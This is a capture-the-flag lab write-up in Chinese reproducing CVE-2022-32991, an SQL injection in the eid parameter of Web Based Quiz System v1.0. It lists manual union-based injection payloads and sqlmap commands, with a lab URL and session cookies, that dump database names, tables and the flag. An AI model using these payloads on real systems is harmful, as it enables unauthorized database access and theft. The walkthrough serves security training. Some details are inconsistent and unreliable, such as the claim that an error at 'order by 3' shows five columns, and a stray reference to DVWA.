## 漏洞简介：

Web Based Quiz System
v1.0版本存在SQL注入漏洞，该漏洞源于welcome.php中的eid参数缺少对外部输入SQL语句的验证。攻击者可利用该漏洞执行非法SQL命令窃取数据库敏感数据。

## 漏洞环境：

春秋云镜中的漏洞靶标，CVE编号为CVE-2022-32991。

## 漏洞复现

打开靶场

发现要账号登陆，有账号注册的地方，先注册账号。

![](https://image.3001.net/images/20230607/1686099337_647fd5899a40c3dedb35a.png!small)

登进网站主页。![](https://image.3001.net/images/20230607/1686099478_647fd616117dee8079b6d.png!small)

寻找注入点，发现第三个的eid参数存在sql注入。

### 有两种方法(手工注入，sqlmap工具注入)

## 1.手工注入

### 1)输入' or '1'='1 --%20(--%20起注释作用注释掉后面的引号)，返回所有数据信息，说明用户输入信息没有做控制。

![](https://image.3001.net/images/20230607/1686099866_647fd79aea0638e3fcf4c.png!small)

### 2) 猜解SQL查询语句中的字段数。具体命令格式如下:

> 'or 1=1 order by 1 --%20
>
> 'or 1=1 order by 2 --%20
>
> 'or 1=1 order by 3 --%20
>
> 'or 1=1 order by 4 --%20
>
> 'or 1=1 order by 5 --%20
>
> 'or 1=1 order by 6 --%20

![](https://image.3001.net/images/20230607/1686100019_647fd83390a0ef8c88adc.png!small)

![](https://image.3001.net/images/20230607/1686100142_647fd8ae2783f441a9dd3.png!small)

order by 3的时候报错，证明查询语句中只有5个字段。

### 3)确定显示的字段顺序（判断显错点）。具体命令格式如下:

> ' union select 1,2,3,4,5 --%20

![](https://image.3001.net/images/20230607/1686100246_647fd9169d4d659925afc.png!small)

### 4)获取当前数据库名称。具体命令格式如下:

> ' union select 1,2,database(),4,5 --%20

![](https://image.3001.net/images/20230607/1686100329_647fd969d1370c59b4205.png!small)

### 5) 获取数据库中的表名。具体命令格式如下：

> ' union select 1,2,group_concat(table_name),4,5 from
> information_schema.tables where table_schema='ctf' --%20

![](https://image.3001.net/images/20230607/1686100512_647fda20055b024f1bf43.png!small)

看到有表名为flag的猜测flag就在这个表里。

### 6) 获取flag表中的字段名。具体命令格式如下：

> ' union select 1,2,group_concat(column_name),4,5 from
> information_schema.columns where table_name='flag' --%20

![](https://image.3001.net/images/20230607/1686100562_647fda5294027b7db1900.png!small)

得到了flag表中的具体字段为flag确定了flag应该就在flag中。

### 7) 获取表中的数据。具体命令格式如下：

> ' union select 1,2,flag,4,5 from flag --%20

![](https://image.3001.net/images/20230607/1686100687_647fdacf616c3e94213f6.png!small)

至此，flag就找到了。

## 2.sqlmap注入

### 1)使用sqlmap检测是否存在注入点

> python sqlmap.py -u
> "http://eci-2zej8e2hn3s4jczjydgi.cloudeci1.ichunqiu.com/welcome.php?q=quiz&step=2&eid=5b141b8009cf0&n=1&t=10"

![](https://image.3001.net/images/20230607/1686100812_647fdb4c84ede3298da3e.png!small)

可以看到对获取到的url进行检测后，会302重定向到登录的url，说明我们检测的url必须带有登录权限才能验证，因此我们的命令中需要带上登录dvwa后的cookie信息。

在谷歌浏览器中贴上对应的cookie。

![](https://image.3001.net/images/20230607/1686100836_647fdb641ad85c1159494.png!small)

（注：u代表url ，--batch指的是sqlmap不会询问你的输入,全部默认确定。每个人都cookie都是不太一样的）

> python sqlmap.py -u
> "http://eci-2zej8e2hn3s4jczjydgi.cloudecil.ichunqiu.com/welcome.php?q=quiz&step=2&eid
> =5b141b8009cf0&n=1&t=10"
> --cookie="td_cookie=640699955;PHPSESSID=3qfukj93lq669vqf1idmnb5qnn" --batch

![](https://image.3001.net/images/20230607/1686101161_647fdca95e3b96dc4fe4f.png!small)![](https://image.3001.net/images/20230607/1686101249_647fdd010c9474551ec2e.png!small)

以上分别列出了存在注入点的参数。

  * 基于布尔的盲注。
  * 基于错误的注入
  * 基于时间的盲注
  * 联合查询

### 2)查看当前连接的数据库。

> python sqlmap.py -u
> "http://eci-2zej8e2hn3s4jczjydgi.cloudeci1.ichunqiu.com/welcome.php?q=quiz&step=2&eid=5b141b8009cf0&n=1&t=10"
> --cookie="td_cookie=640699955;PHPSESSID=3qfukj93lq669vqf1idmnb5qnn"
> --batch–-dbs

![](https://image.3001.net/images/20230607/1686101388_647fdd8cd9ce982ec9d78.png!small)猜测flag在ctf数据库中

### 3)获取当前数据库中的所有数据表

> python sqlmap.py -u
> "http://eci-2zej8e2hn3s4jczjydgi.cloudeci1.ichunqiu.com/welcome.php?q=quiz&step=2&eid=5b141b8009cf0&n=1&t=10"
> --cookie="td_cookie=640699955;PHPSESSID=3qfukj93lq669vqf1idmnb5qnn" --batch
> –D ctf –-tables

![](https://image.3001.net/images/20230607/1686101535_647fde1facbc6321e2590.png!small)

### 4)我们查看flag表中的所有列

> python sqlmap.py -u
> "http://eci-2zej8e2hn3s4jczjydgi.cloudeci1.ichunqiu.com/welcome.php?q=quiz&step=2&eid=5b141b8009cf0&n=1&t=10"
> --cookie="td_cookie=640699955;PHPSESSID=3qfukj93lq669vqf1idmnb5qnn" --batch
> –D ctf -T flag --columns

![](https://image.3001.net/images/20230607/1686101617_647fde711ea82b43cdc58.png!small)

### 5)导出flag表中flag的列

> python sqlmap.py -u
> "http://eci-2zej8e2hn3s4jczjydgi.cloudeci1.ichunqiu.com/welcome.php?q=quiz&step=2&eid=5b141b8009cf0&n=1&t=10"
> --cookie="td_cookie=640699955;PHPSESSID=3qfukj93lq669vqf1idmnb5qnn" --batch
> –D ctf -T flag -C "flag" --dump

![](https://image.3001.net/images/20230607/1686101755_647fdefb9a3ac99c6bf21.png!small)

至此flag也解出来了。

